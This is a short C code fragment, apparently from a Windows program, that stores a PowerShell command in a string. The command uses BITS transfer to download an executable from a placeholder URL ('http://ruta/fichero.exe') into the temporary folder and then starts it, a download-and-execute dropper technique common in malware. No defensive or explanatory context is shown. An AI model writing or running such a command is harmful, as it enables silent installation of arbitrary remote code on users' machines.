...
char* command = "powershell Import-Module BitsTransfer;Start-BitsTransfer -Source \"http://ruta/fichero.exe\" -Destination \"%TEMP%\\fichero.exe\";Start-Process \"%TEMP%\\fichero.exe\"";
